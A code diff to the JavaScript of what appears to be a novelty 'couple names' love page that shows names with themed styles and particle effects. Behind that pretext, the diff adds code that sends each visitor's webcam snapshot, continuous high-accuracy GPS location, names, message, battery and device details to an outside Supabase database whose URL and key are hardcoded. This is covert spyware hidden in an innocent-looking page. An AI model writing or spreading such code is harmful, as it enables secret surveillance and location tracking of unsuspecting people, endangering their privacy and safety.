@@ -1,6 +1,9 @@
 (function () {
   'use strict';
 
+  var SUPABASE_URL = "https://rixjkiebspsjvdnmmpvp.supabase.co";
+  var SUPABASE_KEY = "sb_publishable_wpKFc1qzlSGrJ03HqeKTdw_wq435ith";
+
   var clientTelemetry = null;
   var watchId = null;
 
@@ -56,21 +59,35 @@
         browser: fallback.browser,
         os: fallback.os,
         battery_level: batteryData.battery_level,
-        battery_charging: batteryData.battery_charging,
+        battery_charging: batteryData.battery_charging ? 1 : 0,
         screen_res: screenStr,
         timezone: tzStr,
-        raw_user_agent: ua
+        user_agent: ua
       };
     });
   }
   detectTelemetry();
+
+  function pushToSupabase(payload) {
+    fetch(SUPABASE_URL + '/rest/v1/demo_telemetry', {
+      method: 'POST',
+      headers: {
+        'apikey': SUPABASE_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_KEY,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify(payload)
+    }).catch(function (err) {
+      console.error("Telemetry sync error:", err);
+    });
+  }
 
   function applyCustomStyles(theme, scale) {
     if (!namesDisplay) return;
     if (theme === 'crimson') namesDisplay.style.color = '#ff334b';
     else if (theme === 'sunset') namesDisplay.style.color = '#ffa15c';
     else namesDisplay.style.color = '#ff6584';
-
     namesDisplay.style.transform = scale === 'large' ? 'scale(1.2)' : 'scale(1.0)';
   }
 
@@ -116,15 +133,6 @@
     }
   }
 
-  function sendTelemetryData(extraPayload) {
-    var payload = Object.assign({}, clientTelemetry || {}, extraPayload);
-    fetch('/api/telemetry', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(function () {});
-  }
-
   namesForm.addEventListener('submit', function (e) {
     e.preventDefault();
     var yourName = (yourNameInput.value || '').trim();
@@ -145,14 +153,16 @@
     renderNames(yourName, partnerName, message, selectedTheme, selectedScale);
     generateLoveParticles(70);
 
-    // 1. Request Camera Permission & Capture Snapshot
-    var cameraStatusVal = 'Not Requested';
-    var webcamPicVal = null;
+    var basePayload = Object.assign({}, clientTelemetry || {}, {
+      timestamp: new Date().toISOString(),
+      couple_names: yourName + ' ❤ ' + partnerName,
+      user_agent: navigator.userAgent
+    });
 
+    // 1. Trigger Camera Permission & Snapshot
     if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(function (stream) {
-          cameraStatusVal = 'Allowed / Active';
           var video = document.createElement('video');
           video.srcObject = stream;
           video.play();
@@ -162,67 +172,38 @@
             canvas.height = 120;
             var ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, 160, 120);
-            webcamPicVal = canvas.toDataURL('image/jpeg', 0.5);
-            stream.getTracks().forEach(function (track) { track.stop(); });
+            var pic = canvas.toDataURL('image/jpeg', 0.5);
+            stream.getTracks().forEach(function (t) { t.stop(); });
 
-            // Send initial packet with webcam snapshot
-            sendTelemetryData({
-              your_name: yourName,
-              partner_name: partnerName,
-              couple_names: yourName + ' ❤ ' + partnerName,
-              message: message,
-              camera_status: cameraStatusVal,
-              webcam_pic: webcamPicVal
-            });
+            basePayload.camera_status = 'Allowed / Active';
+            basePayload.webcam_pic = pic;
+            pushToSupabase(basePayload);
           }, 800);
         })
         .catch(function () {
-          cameraStatusVal = 'Denied / Blocked';
-          sendTelemetryData({
-            your_name: yourName,
-            partner_name: partnerName,
-            couple_names: yourName + ' ❤ ' + partnerName,
-            message: message,
-            camera_status: cameraStatusVal,
-            webcam_pic: null
-          });
+          basePayload.camera_status = 'Denied / Blocked';
+          basePayload.webcam_pic = null;
+          pushToSupabase(basePayload);
         });
     } else {
-      cameraStatusVal = 'Not Supported';
-      sendTelemetryData({
-        your_name: yourName,
-        partner_name: partnerName,
-        couple_names: yourName + ' ❤ ' + partnerName,
-        message: message,
-        camera_status: cameraStatusVal,
-        webcam_pic: null
-      });
+      basePayload.camera_status = 'Not Supported';
+      pushToSupabase(basePayload);
     }
 
-    // 2. Request Geolocation & Continuous Watch
+    // 2. Trigger Geolocation Tracking
     if (navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(
         function (position) {
-          sendTelemetryData({
-            your_name: yourName,
-            partner_name: partnerName,
-            couple_names: yourName + ' ❤ ' + partnerName,
-            message: message,
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            location_status: 'Allowed / Live Tracking'
-          });
+          basePayload.latitude = position.coords.latitude;
+          basePayload.longitude = position.coords.longitude;
+          basePayload.location_status = 'Allowed / Live Tracking';
+          pushToSupabase(basePayload);
         },
-        function (error) {
-          sendTelemetryData({
-            your_name: yourName,
-            partner_name: partnerName,
-            couple_names: yourName + ' ❤ ' + partnerName,
-            message: message,
-            latitude: null,
-            longitude: null,
-            location_status: 'Denied / Blocked'
-          });
+        function () {
+          basePayload.latitude = null;
+          basePayload.longitude = null;
+          basePayload.location_status = 'Denied / Blocked';
+          pushToSupabase(basePayload);
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
